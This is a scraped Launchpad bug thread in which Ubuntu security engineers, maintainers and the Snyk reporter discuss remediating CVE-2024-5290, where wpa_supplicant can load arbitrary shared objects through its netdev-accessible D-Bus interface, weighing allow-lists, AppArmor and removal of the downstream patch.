      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~eslerm" class="sprite person">Mark Esler (eslerm)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-05-30T17:28:01.552212+00:00" title="2024-05-30 17:28:01 UTC">on 2024-05-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Adding Desktop&#x27;s wpa maintainers and Marc to bug.</p>
<p>If I understand correctly, the upstream commit is a mitigation, not a patch. A security patch requires Ubuntu to change our implementation, which would likely require upstream&#x27;s mitigation.</p>
<p>Basically, we should make it impossible for the netdev group to load arbitrary modules.</p>
<p>From @mdeslaur:<br />
<span class="foldable-quoted">
&gt;  So upstream isn&#x27;t vulnerable as they only expose the dbus interface to root. Downstreams like Ubuntu and Chromium added a patch that grants access to the netdev group. The patch is the problem, not the upstream code IMHO
</span></p>
<p>and:<br />
<span class="foldable-quoted">
&gt; I wonder if just modifying wpa_supplicant to load from the trusted lib directory wouldn&#x27;t be vulnerable to the same type of thing
</span></p>
<p>Sudhakar, if that feels correct, could you please edit this bugs title?</p>
<p>Remediators, please note that others have implemented similar vulnerabilities using wpa_supplicant:<br />
<a rel="nofollow" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1398996&amp;no_tracker_redirect=1">https:/<wbr />/bugs.chromium.<wbr />org/p/chromium/<wbr />issues/<wbr />detail?<wbr />id=1398996&amp;<wbr />no_tracker_<wbr />redirect=<wbr />1</a><br />
<a rel="nofollow" href="https://issues.chromium.org/issues/40062113">https:/<wbr />/issues.<wbr />chromium.<wbr />org/issues/<wbr />40062113</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Adding Desktop's wpa maintainers and Marc to bug.

If I understand correctly, the upstream commit is a mitigation, not a patch. A security patch requires Ubuntu to change our implementation, which would likely require upstream's mitigation.

Basically, we should make it impossible for the netdev group to load arbitrary modules.

From @mdeslaur:
&gt;  So upstream isn't vulnerable as they only expose the dbus interface to root. Downstreams like Ubuntu and Chromium added a patch that grants access to the netdev group. The patch is the problem, not the upstream code IMHO

and:
&gt; I wonder if just modifying wpa_supplicant to load from the trusted lib directory wouldn't be vulnerable to the same type of thing

Sudhakar, if that feels correct, could you please edit this bugs title?

Remediators, please note that others have implemented similar vulnerabilities using wpa_supplicant:
https://bugs.chromium.org/p/chromium/issues/detail?id=1398996&amp;no_tracker_redirect=1
https://issues.chromium.org/issues/40062113</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~sudhackar" class="sprite person">Sudhakar Verma (sudhackar)</a>
    
    <time title="2024-05-31 08:18:58 UTC" datetime="2024-05-31T08:18:58.416093+00:00">on 2024-05-31</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>summary</b>:
      </td>
      <td>
        - CVE-2024-5290 : upstream patch available<br />+ CVE-2024-5290 : Fix loading of arbitrary shared objects
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~eslerm" class="sprite person">Mark Esler (eslerm)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-05-31T14:46:12.689909+00:00" title="2024-05-31 14:46:12 UTC">on 2024-05-31</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks.</p>
<p>Adding Rory McNamara from Snyk Security Labs who originally reported this issue on May 8th 2024.</p>
<p>Rory, there was a delay in starting remediation due to a company wide sprint in Madrid and for initially contacting the netplan team instead of the wpa maintainers about this issue. When there is a patch timeline I will relay it.</p>
<p>Remediators, will this be possible to address by August 6th 2024 (90 days after private disclosure)?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks.

Adding Rory McNamara from Snyk Security Labs who originally reported this issue on May 8th 2024.

Rory, there was a delay in starting remediation due to a company wide sprint in Madrid and for initially contacting the netplan team instead of the wpa maintainers about this issue. When there is a patch timeline I will relay it.

Remediators, will this be possible to address by August 6th 2024 (90 days after private disclosure)?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~rmcnamara-snyk" class="sprite person">Rory McNamara (rmcnamara-snyk)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-05-31T15:15:31.480856+00:00" title="2024-05-31 15:15:31 UTC">on 2024-05-31</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks for the visibility.</p>
<p>For what it&#x27;s worth,</p>
<p><span class="foldable-quoted">&gt; I wonder if just modifying wpa_supplicant to load from the trusted lib directory wouldn&#x27;t be vulnerable to the same type of thing
</span></p>
<p>I think this would be a good solution (assuming built to protect against directory traversal et al). The original report included the suggestion to do the same with an AppArmor profile (wpa_supplicant is currently unconfined).</p>
<p>The build-time patch used by ChromeOS was not suggested by me as I wasn&#x27;t sure if it was desirable for Ubuntu&#x27;s use-cases (the referenced report to ChromeOS is also from me)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks for the visibility.

For what it's worth,

&gt; I wonder if just modifying wpa_supplicant to load from the trusted lib directory wouldn't be vulnerable to the same type of thing

I think this would be a good solution (assuming built to protect against directory traversal et al). The original report included the suggestion to do the same with an AppArmor profile (wpa_supplicant is currently unconfined).

The build-time patch used by ChromeOS was not suggested by me as I wasn't sure if it was desirable for Ubuntu's use-cases (the referenced report to ChromeOS is also from me)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~slyon" class="sprite person">Lukas Märdian (slyon)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-06-06T09:19:40.116424+00:00" title="2024-06-06 09:19:40 UTC">on 2024-06-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>FTR:<br />
Using Spyros&#x27; &quot;Ubuntu Code Search&quot; I wasn&#x27;t able to find any usage of &quot;opensc_<wbr />engine_<wbr />path&quot; inside Ubuntu&#x27;s default configuration, except for the example config in src:wpa wpa_supplicant/<wbr />wpa_supplicant.<wbr />conf, which is also commented out.</p>
<p>Similarly for Debian: <a rel="nofollow" href="https://codesearch.debian.net/search?q=opensc_engine_path.%3F%3D&amp;literal=0">https:/<wbr />/codesearch.<wbr />debian.<wbr />net/search?<wbr />q=opensc_<wbr />engine_<wbr />path.%3F%<wbr />3D&amp;literal=<wbr />0</a></p>
<p>For &quot;pkcs11_<wbr />engine_<wbr />path&quot; OTOH, I can see some usage from src:network-<wbr />manager, related to patches for <a href="/bugs/120363" class="bug-link">bug #120363</a><br />
Also example configs in src:wpa wpa_supplicant/<wbr />examples/<wbr />openCryptoki.<wbr />conf and wpa_supplicant/<wbr />wpa_supplicant.<wbr />conf</p>
<p>I&#x27;ll leave it to the Desktop team as the maintainers of src:wpa to decide which paths need to be whitelisted, though.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">FTR:
Using Spyros' "Ubuntu Code Search" I wasn't able to find any usage of "opensc_engine_path" inside Ubuntu's default configuration, except for the example config in src:wpa wpa_supplicant/wpa_supplicant.conf, which is also commented out.

Similarly for Debian: https://codesearch.debian.net/search?q=opensc_engine_path.%3F%3D&amp;literal=0

For "pkcs11_engine_path" OTOH, I can see some usage from src:network-manager, related to patches for bug #120363
Also example configs in src:wpa wpa_supplicant/examples/openCryptoki.conf and wpa_supplicant/wpa_supplicant.conf

I'll leave it to the Desktop team as the maintainers of src:wpa to decide which paths need to be whitelisted, though.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~seb128" class="sprite person">Sebastien Bacher (seb128)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-06-06T13:48:06.307192+00:00" title="2024-06-06 13:48:06 UTC">on 2024-06-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Sorry but while &#x27;wpa&#x27; is technically owned by our team we currently have no networking resource on the team and we are not actively maintaining wpa and don&#x27;t have real domain knowledge. I will try to see if we can find someone to do some investigation from our side (but we are also short on available resources...) but any help from other teams would be welcome</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Sorry but while 'wpa' is technically owned by our team we currently have no networking resource on the team and we are not actively maintaining wpa and don't have real domain knowledge. I will try to see if we can find someone to do some investigation from our side (but we are also short on available resources...) but any help from other teams would be welcome</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/6" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~eslerm" class="sprite person">Mark Esler (eslerm)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-06-06T20:42:10.972634+00:00" title="2024-06-06 20:42:10 UTC">on 2024-06-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/6"> #6</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Chromium has two branches for their fix. In the earlier branch, they discuss writing their solution so that it can be upstream-able to wpa_supplicant:</p>
<p><a rel="nofollow" href="https://chromium-review.googlesource.com/q/I7b03e7eadba2407bed19662ef5ddac578b2d8d94">https:/<wbr />/chromium-<wbr />review.<wbr />googlesource.<wbr />com/q/I7b03e7ea<wbr />dba2407bed19662<wbr />ef5ddac578b2d8d<wbr />94</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Chromium has two branches for their fix. In the earlier branch, they discuss writing their solution so that it can be upstream-able to wpa_supplicant:

https://chromium-review.googlesource.com/q/I7b03e7eadba2407bed19662ef5ddac578b2d8d94</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~eslerm" class="sprite person">Mark Esler (eslerm)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-06-07T17:16:21.713269+00:00" title="2024-06-07 17:16:21 UTC">on 2024-06-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Ideally Desktop can provide a security fix.</p>
<p>Perhaps upstreaming part of Chromium&#x27;s fix can be revisited.</p>
<p>Security Engineering may be able to provide a mitigation with AppArmor. We would need to make sure the policy restricts where files can be mapped from.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Ideally Desktop can provide a security fix.

Perhaps upstreaming part of Chromium's fix can be revisited.

Security Engineering may be able to provide a mitigation with AppArmor. We would need to make sure the policy restricts where files can be mapped from.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~alexmurray" class="sprite person">Alex Murray (alexmurray)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-06-19T05:36:45.667765+00:00" title="2024-06-19 05:36:45 UTC">on 2024-06-19</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>So from the Ubuntu side the issue we have is that we do not know exactly all the ways that this functionality is being legitimately used in various deployments, making it hard to appropriately allow-list  the various module paths at compile time. However, saying that, based on my current understanding of this issue, these are the ideas I am considering to try and mitigate this:</p>
<p>1. Backport the allow-listing patch and compile wpa with a list of paths known to be supported out of the box for the packages in Ubuntu - ie. given that say opensc as packaged in Ubuntu has standard paths for its modules we can define both (replacing x86_64-linux-gnu with $(dpkg-architecture -q DEB_BUILD_<wbr />MULTIARCH)<wbr />)</p>
<p>CONFIG_<wbr />PKCS11_<wbr />ENGINE_<wbr />PATH=/usr/<wbr />lib/x86_<wbr />64-linux-<wbr />gnu/engines-<wbr />3/pkcs11.<wbr />so<br />
CONFIG_<wbr />PKCS11_<wbr />MODULE_<wbr />PATH=/usr/<wbr />lib/x86_<wbr />64-linux-<wbr />gnu/opensc-<wbr />pkcs11.<wbr />so<br />
CONFIG_<wbr />OPENSC_<wbr />ENGINE_<wbr />PATH=/usr/<wbr />lib/x86_<wbr />64-linux-<wbr />gnu/libopensc.<wbr />so.11</p>
<p>However this would break anyone trying to use their own opensc/pkcs11 engines that are not installed at these locations.</p>
<p>2. Patch wpa so that it checks the permissions of either/both of the configuration file provided in CreateInterface and the shared object loaded by this configuration - if this is NOT owned by root then refuse to load it</p>
<p>However, this would break anything that is NOT running as root but is running under the netdev group.</p>
<p>3. Restrict access (send permission) to the CreateInterface dbus method to only the root user via dbus policy</p>
<p>However, this would also break anything which is currently using this method that is NOT running as root but is running under the netdev group.</p>
<p>All of these have a reasonable risk of regression - so given this, and the fact that to exploit this vulnerability requires the use of the netdev group (which is not granted to regular user accounts), perhaps this may be better left unpatched?</p>
<p>However I am open to suggestions if anyone has any regarding a possible way forward (whether from the ideas suggested here or something entirely different).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">So from the Ubuntu side the issue we have is that we do not know exactly all the ways that this functionality is being legitimately used in various deployments, making it hard to appropriately allow-list  the various module paths at compile time. However, saying that, based on my current understanding of this issue, these are the ideas I am considering to try and mitigate this:

1. Backport the allow-listing patch and compile wpa with a list of paths known to be supported out of the box for the packages in Ubuntu - ie. given that say opensc as packaged in Ubuntu has standard paths for its modules we can define both (replacing x86_64-linux-gnu with $(dpkg-architecture -q DEB_BUILD_MULTIARCH))

CONFIG_PKCS11_ENGINE_PATH=/usr/lib/x86_64-linux-gnu/engines-3/pkcs11.so
CONFIG_PKCS11_MODULE_PATH=/usr/lib/x86_64-linux-gnu/opensc-pkcs11.so
CONFIG_OPENSC_ENGINE_PATH=/usr/lib/x86_64-linux-gnu/libopensc.so.11

However this would break anyone trying to use their own opensc/pkcs11 engines that are not installed at these locations.

2. Patch wpa so that it checks the permissions of either/both of the configuration file provided in CreateInterface and the shared object loaded by this configuration - if this is NOT owned by root then refuse to load it

However, this would break anything that is NOT running as root but is running under the netdev group.

3. Restrict access (send permission) to the CreateInterface dbus method to only the root user via dbus policy

However, this would also break anything which is currently using this method that is NOT running as root but is running under the netdev group.


All of these have a reasonable risk of regression - so given this, and the fact that to exploit this vulnerability requires the use of the netdev group (which is not granted to regular user accounts), perhaps this may be better left unpatched?

However I am open to suggestions if anyone has any regarding a possible way forward (whether from the ideas suggested here or something entirely different).

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~eslerm" class="sprite person">Mark Esler (eslerm)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-16T22:06:14.546553+00:00" title="2024-07-16 22:06:14 UTC">on 2024-07-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Please be aware that embargo ends on 6th of August.</p>
<p>If a patch is forthcoming, I can request an embargo extension from Snyk.</p>
<p>When embargo ends, Snyk intends to publish a blog post about a vulnerability chain which includes this issue.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Please be aware that embargo ends on 6th of August.

If a patch is forthcoming, I can request an embargo extension from Snyk.

When embargo ends, Snyk intends to publish a blog post about a vulnerability chain which includes this issue.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/10" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-17T23:50:03.924947+00:00" title="2024-07-17 23:50:03 UTC">on 2024-07-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/10"> #10</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I have searched through all the packages in the Ubuntu archive that use the fi.w1.wpa_<wbr />supplicant1 dbus interface, and not a single one of them appears to do it with the netdev user.</p>
<p>While the original intention of the patch appears to have been to allow non-administrative users to be put in the netdev group and access the wpa dbus interface directly, I see no valid reason for this. Users should be managing network interfaces on the desktop through Network Manager, which does allow being configured by users in the netdev group.</p>
<p>I believe our best course of action here is to simply remove the patch that grants access to the netdev group.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I have searched through all the packages in the Ubuntu archive that use the fi.w1.wpa_supplicant1 dbus interface, and not a single one of them appears to do it with the netdev user.

While the original intention of the patch appears to have been to allow non-administrative users to be put in the netdev group and access the wpa dbus interface directly, I see no valid reason for this. Users should be managing network interfaces on the desktop through Network Manager, which does allow being configured by users in the netdev group.

I believe our best course of action here is to simply remove the patch that grants access to the netdev group.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/11" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~seb128" class="sprite person">Sebastien Bacher (seb128)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-18T10:22:00.877687+00:00" title="2024-07-18 10:22:00 UTC">on 2024-07-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/11"> #11</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks for doing the investigation Marc! There is always the risk that someone is relying on the patch but that should be a low number of users and removing the patch seems the best course or action here unless we decide to do nothing, I would be fine with either of those options</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
